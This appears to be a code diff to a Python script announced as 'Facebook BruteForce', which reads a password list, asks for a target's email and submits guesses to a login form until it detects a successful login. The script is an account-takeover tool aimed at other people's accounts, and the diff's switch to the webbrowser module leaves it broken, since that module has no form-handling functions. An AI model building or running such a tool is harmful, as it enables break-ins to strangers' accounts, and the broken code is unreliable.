@@ -1,5 +1,6 @@
 import sys
 from ast import Break
+import webbrowser
 import time
 if sys.version_info[0] !=2: 
 	print('''--------------------------------------
@@ -15,15 +16,8 @@ headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
-try:
-	import urllib
-	import mechanize
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
 
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('passwords.txt','r')
 
 email = input("input Email of target:")
@@ -36,13 +30,13 @@ while file:
 	if len(password) < 6:
 		continue
 	print=str(i) +" : ",password
-	response = browser.open(post_url)
+	response = webbrowser.open(post_url)
 	try:
 		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['email'] = email
-			browser.form['pass'] = password
-			response = browser.submit()
+			webbrowser.select_form(nr=0)
+			webbrowser.form['email'] = email
+			webbrowser.form['pass'] = password
+			response = webbrowser.submit()
 			response_data = response.read()
 			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
 				print('Your password is : ',password)
